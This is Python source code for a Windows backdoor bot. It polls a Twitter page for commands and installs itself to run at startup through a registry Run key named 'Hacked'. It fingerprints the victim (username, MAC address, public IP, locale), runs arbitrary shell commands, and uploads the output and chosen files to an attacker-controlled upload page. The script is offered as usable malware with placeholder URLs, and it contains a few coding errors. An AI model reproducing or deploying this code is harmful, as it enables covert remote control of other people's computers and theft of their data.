import platform
from getpass import getuser
from locale import getdefaultlocale
import requests
import subprocess
import time
import os
import shutil
import _winreg as wreg
import random
from bs4 import BeautifulSoup
from uuid import getnode as get_mac
import json

twitterUrl = "<twitterUrl>"
uploadURL = 'https://<your paid or free hosting site address >/upload.php'
tweetNumberFromTopRecent = 0  # the topmost tweet
identification = {}
botname = ''
proxyDict = {'http': "http://username:pasword@proxyserver:proxyport"}   # use this only if needed 


def commandFromTwitter(twitterUrl):
    response = sendGet(twitterUrl)
    soup = BeautifulSoup(response.text, 'html.parser')
    # For parsing the first tweet
    command = soup.find_all("p", {"class": "js-tweet-text"})[tweetNumberFromTopRecent].contents[0]
    return command


def persistence():
    path = os.getcwd().strip('\n')  # get the current working directory
    Null, userprof = subprocess.check_output('set USERPROFILE', shell=True).split('=')  # Get userprofile

    # Place where you wish your backdoor to be copied , here it is C:\Users\<UserName>\Documents
    destination = userprof.strip('\n\r') + '\\Documents' + '\clipbrd.exe'

    if not os.path.exists(destination):
        shutil.copyfile(path + '\clipbrd.exe', destination)
        # This is one of the keys that allows to run on startup , others can be found using
        # sysinternals tools and other methods like googling
        key = wreg.OpenKey(wreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run",
                           0, wreg.KEY_ALL_ACCESS)
        # Hacked is the key name that will run our backdoor on startup
        wreg.SetValueEx(key, 'Hacked', 0, wreg.REG_SZ, destination)
        key.Close()


def sendGet(Url):
    response = requests.get(url=Url, proxies=proxyDict)
    return response


def sendPost(Url, data, files=None):
    response = requests.post(url=Url, data=data, proxies=proxyDict)
    return response


def getSysDetails():
    global identification
    # generate a unique id to identify the PC
    publicIP = sendGet("http://www.httpbin.org/ip")  # Retrieves ip , local and global
    IP = publicIP.json()  # creates a json object of IPs received
    IP = IP['origin'].split(',')
    if len(IP) > 1:
        publicIP = IP[len(IP) - 1]  # last ip is the public ip
    else:
        publicIP = IP[1]  # last ip is the public ip
    addr = get_mac()  # To uniquely identify the PC
    h = iter(hex(addr)[2:].zfill(12))
    macAddr = "_".join(
        i + next(h) for i in h)  # Taken from http://stackoverflow.com/questions/28927958/python-get-mac-address
    username = getuser()  # Get Username
    locale = getdefaultlocale()[0]  # Helps in identifying the country
    plat = platform.platform()
    arch = platform.machine()
    nodename = platform.node()
    identification = {'locale': locale, 'username': username, 'macAddr': macAddr, 'publicIP': publicIP,
                      'platform': plat, 'architecture': arch, 'Name': nodename}
    iD = identification
    return json.dumps(iD)


def initialize():
    persistence()
    global identification
    identification = getSysDetails()  # send sysDetails on initialisation and set hostname for identifying bot
    print identification
    print type(identification)
    dictID = json.loads(identification)
    global botname
    botname = dictID['locale'] + "_" + dictID['username'] + "_" + dictID['macAddr']
    print botname


initialize()


def connect():
    while True:
        command = commandFromTwitter(twitterUrl)
        print command

        if 'terminate' in command:
            return 1

        elif 'grab' in command:
            grab, path = command.split('*')
            if os.path.exists(path):
                files = {'file': open(path, 'rb')}
                r = sendPost(uploadURL, data={'botname': botname}, files=files)
            else:
                r = sendPost(uploadURL, data='[-]File Not Found')

        else:
            CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE,
                                   stdin=subprocess.PIPE, stderr=subprocess.PIPE)
            post_response = sendPost(url, CMD.stdout.read())
            post_response = sendPost(url, CMD.stderr.read())

        time.sleep(3)


while True:
    try:
        if connect() == 1:
            break  # 1 is the value against terminate command

    except:
        sleep_for = random.randrange(1, 10)
        time.sleep(sleep_for)  # 1 - 10 seconds wait time
        pass
